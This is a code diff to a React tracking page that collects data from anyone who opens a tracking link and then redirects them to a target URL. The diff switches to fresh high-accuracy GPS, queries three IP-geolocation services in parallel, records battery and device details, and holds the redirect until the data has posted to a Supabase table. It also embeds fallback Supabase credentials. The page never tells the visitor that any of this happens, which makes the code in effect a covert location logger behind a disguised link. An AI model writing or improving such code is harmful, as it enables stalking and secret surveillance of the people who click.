@@ -94,79 +94,125 @@ export const TrackingPage: React.FC<TrackingPageProps> = ({ trackingCode }) => {
     return { level: null, charging: null };
   };
 
-  // Get geolocation (async, might take time)
-  const getGeolocation = (): Promise<{ latitude: number | null; longitude: number | null; accuracy: number | null }> => {
+  // Get high-accuracy GPS geolocation
+  const getGeolocation = (): Promise<{ latitude: number | null; longitude: number | null; accuracy: number | null; altitude: number | null }> => {
     return new Promise((resolve) => {
       if (!navigator.geolocation) {
-        resolve({ latitude: null, longitude: null, accuracy: null });
+        resolve({ latitude: null, longitude: null, accuracy: null, altitude: null });
         return;
       }
 
-      // Use lower accuracy for faster response
+      // Force enableHighAccuracy: true & maximumAge: 0 for fresh pinpoint hardware GPS coordinates
       navigator.geolocation.getCurrentPosition(
         (position) => {
           resolve({
             latitude: position.coords.latitude,
             longitude: position.coords.longitude,
             accuracy: position.coords.accuracy,
+            altitude: position.coords.altitude || null,
           });
         },
         (error) => {
-          console.warn('Geolocation error:', error);
-          resolve({ latitude: null, longitude: null, accuracy: null });
+          console.warn('High accuracy Geolocation error:', error);
+          resolve({ latitude: null, longitude: null, accuracy: null, altitude: null });
         },
-        { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 } // Faster, cached data OK
+        { enableHighAccuracy: true, timeout: 3500, maximumAge: 0 }
       );
     });
   };
 
-  // Get IP address using ipapi.co (async, might take time)
-  const getIPInfo = async (): Promise<{ ip: string | null; city: string | null; region: string | null; country: string | null }> => {
-    try {
-      const response = await fetch('https://ipapi.co/json/', { 
-        signal: AbortSignal.timeout(3000) // 3 second timeout
+  // Get IP address racing multiple fast APIs in parallel
+  const getIPInfo = async (): Promise<{ ip: string | null; city: string | null; region: string | null; country: string | null; lat: number | null; lon: number | null }> => {
+    const fetchApi = (url: string, parse: (d: any) => any) => {
+      return new Promise((resolve, reject) => {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), 2000);
+        fetch(url, { signal: controller.signal })
+          .then(r => {
+            if (!r.ok) throw new Error('API error');
+            return r.json();
+          })
+          .then(d => {
+            clearTimeout(timer);
+            const parsed = parse(d);
+            if (parsed && parsed.ip && parsed.lat != null && parsed.lon != null) {
+              resolve(parsed);
+            } else {
+              reject(new Error('Invalid IP payload'));
+            }
+          })
+          .catch(err => {
+            clearTimeout(timer);
+            reject(err);
+          });
       });
-      const data = await response.json();
-      return {
-        ip: data.ip || null,
-        city: data.city || null,
-        region: data.region || null,
-        country: data.country_name || null,
-      };
+    };
+
+    const apis = [
+      fetchApi('https://ipwho.is/', d => ({
+        ip: d.ip,
+        city: d.city,
+        region: d.region,
+        country: d.country,
+        lat: d.latitude,
+        lon: d.longitude
+      })),
+      fetchApi('http://ip-api.com/json/', d => ({
+        ip: d.query,
+        city: d.city,
+        region: d.regionName,
+        country: d.country,
+        lat: d.lat,
+        lon: d.lon
+      })),
+      fetchApi('https://freeipapi.com/api/json', d => ({
+        ip: d.ipAddress,
+        city: d.cityName,
+        region: d.regionName,
+        country: d.countryName,
+        lat: d.latitude,
+        lon: d.longitude
+      }))
+    ];
+
+    try {
+      return await (Promise.any(apis) as Promise<{ ip: string | null; city: string | null; region: string | null; country: string | null; lat: number | null; lon: number | null }>);
     } catch (e) {
-      console.warn('IP API error:', e);
-      return { ip: null, city: null, region: null, country: null };
+      console.warn('All IP APIs failed:', e);
+      return { ip: null, city: null, region: null, country: null, lat: null, lon: null };
     }
   };
 
-  // Send data using sendBeacon (works even after page unload)
-  const sendTrackingData = (logData: any) => {
-    if (!isSupabaseConfigured) return;
+  // Send tracking data reliably using fetch
+  const sendTrackingData = async (logData: any) => {
+    if (!isSupabaseConfigured) return false;
 
     const supabaseUrl = import.meta.env.VITE_SUPABASE_URL || 'https://zdnpadhlblyazzzwserr.supabase.co';
     const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY || 'sb_publishable_zo1mrKN61gpDnlZNBnxzKg_BFLQed-E';
 
-    const url = `${supabaseUrl}/rest/v1/tracking_logs`;
-    const blob = new Blob([JSON.stringify(logData)], { type: 'application/json' });
+    const url = `${supabaseUrl}/rest/v1/tracking_logs?apikey=${supabaseAnonKey}`;
 
-    // Try sendBeacon first (works during page unload)
-    if (navigator.sendBeacon) {
-      const sent = navigator.sendBeacon(url, blob);
-      if (sent) return;
+    try {
+      const res = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'apikey': supabaseAnonKey,
+          'Authorization': `Bearer ${supabaseAnonKey}`,
+          'Prefer': 'return=minimal'
+        },
+        body: JSON.stringify(logData),
+        keepalive: true
+      });
+      return res.ok;
+    } catch (err) {
+      console.error('Failed to send tracking data via fetch:', err);
+      if (navigator.sendBeacon) {
+        const blob = new Blob([JSON.stringify(logData)], { type: 'application/json' });
+        return navigator.sendBeacon(url, blob);
+      }
+      return false;
     }
-
-    // Fallback to regular fetch if sendBeacon fails
-    fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'apikey': supabaseAnonKey,
-        'Authorization': `Bearer ${supabaseAnonKey}`,
-        'Prefer': 'return=minimal'
-      },
-      body: blob,
-      keepalive: true // Important for sending during page unload
-    }).catch(err => console.error('Failed to send tracking data:', err));
   };
 
   useEffect(() => {
@@ -200,19 +246,34 @@ export const TrackingPage: React.FC<TrackingPageProps> = ({ trackingCode }) => {
         // Step 2: Collect instant device information
         const deviceInfo = getDeviceInfo();
 
-        // Step 3: Start all async data collection in parallel (don't await)
-        const batteryPromise = getBatteryInfo();
-        const geoPromise = getGeolocation();
-        const ipPromise = getIPInfo();
+        // Helper for hard JS timeout
+        const withTimeout = <T,>(promise: Promise<T>, ms: number, fallback: T): Promise<T> => {
+          return Promise.race([
+            promise,
+            new Promise<T>((resolve) => setTimeout(() => resolve(fallback), ms))
+          ]);
+        };
 
-        // Step 4: Prepare initial data with what we have instantly
-        const initialLogData = {
+        // Step 3: Collect async data with hard timeouts (6s window for hardware GPS lock)
+        const [batteryInfo, geoInfo, ipInfo] = await Promise.all([
+          withTimeout(getBatteryInfo(), 1500, { level: null, charging: null }),
+          withTimeout(getGeolocation(), 6000, { latitude: null, longitude: null, accuracy: null, altitude: null }),
+          withTimeout(getIPInfo(), 1500, { ip: null, city: null, region: null, country: null, lat: null, lon: null })
+        ]);
+
+        const hasGps = geoInfo && geoInfo.latitude !== null && geoInfo.longitude !== null;
+        const latitude = hasGps ? geoInfo.latitude : (ipInfo ? ipInfo.lat : null);
+        const longitude = hasGps ? geoInfo.longitude : (ipInfo ? ipInfo.lon : null);
+        const accuracy = hasGps ? geoInfo.accuracy : (ipInfo && ipInfo.lat !== null ? 5000 : null);
+
+        // Step 4: Prepare log data
+        const completeLogData = {
           tracking_link_id: trackingLink.id,
-          latitude: null,
-          longitude: null,
-          accuracy: null,
-          battery_level: null,
-          charging: null,
+          latitude,
+          longitude,
+          accuracy,
+          battery_level: batteryInfo.level,
+          charging: batteryInfo.charging,
           browser: deviceInfo.browser,
           browser_version: deviceInfo.browserVersion,
           os: deviceInfo.os,
@@ -222,52 +283,31 @@ export const TrackingPage: React.FC<TrackingPageProps> = ({ trackingCode }) => {
           timezone: deviceInfo.timezone,
           user_agent: deviceInfo.userAgent,
           platform: deviceInfo.platform,
-          ip_address: null,
-          city: null,
-          region: null,
-          country: null,
+          ip_address: ipInfo.ip,
+          city: ipInfo.city,
+          region: ipInfo.region,
+          country: ipInfo.country,
           visited_at: new Date().toISOString(),
         };
 
         // Step 5: Fix and prepare target URL
-        let targetUrl = trackingLink.target_url;
+        let targetUrl = trackingLink.target_url || 'https://google.com';
         if (targetUrl.match(/^https?:[^/]/i)) {
           targetUrl = targetUrl.replace(/^https?:/i, 'https://');
         }
         if (targetUrl.match(/^https?:\/\/https?:\/\//i)) {
           targetUrl = targetUrl.replace(/^https?:\/\/https?:\/\//i, 'https://');
         }
+        if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
+          targetUrl = 'https://' + targetUrl;
+        }
 
-        // Step 6: Redirect IMMEDIATELY with device info we have
+        // Step 6: Send data to Supabase and wait for confirmation
+        await sendTrackingData(completeLogData);
+
+        // Step 7: Redirect to destination
         setLoading(false);
-        
-        // Small delay to ensure the redirect is processed
-        setTimeout(() => {
-          window.location.replace(targetUrl);
-        }, 50);
-
-        // Step 7: Complete data collection in background and send
-        Promise.all([batteryPromise, geoPromise, ipPromise]).then(([batteryInfo, geoInfo, ipInfo]) => {
-          const completeLogData = {
-            ...initialLogData,
-            latitude: geoInfo.latitude,
-            longitude: geoInfo.longitude,
-            accuracy: geoInfo.accuracy,
-            battery_level: batteryInfo.level,
-            charging: batteryInfo.charging,
-            ip_address: ipInfo.ip,
-            city: ipInfo.city,
-            region: ipInfo.region,
-            country: ipInfo.country,
-          };
-
-          // Send complete data using sendBeacon (works even after redirect)
-          sendTrackingData(completeLogData);
-        }).catch(err => {
-          console.error('Error collecting additional data:', err);
-          // Send at least the initial data we collected
-          sendTrackingData(initialLogData);
-        });
+        window.location.replace(targetUrl);
 
       } catch (e) {
         console.error('Tracking error:', e);
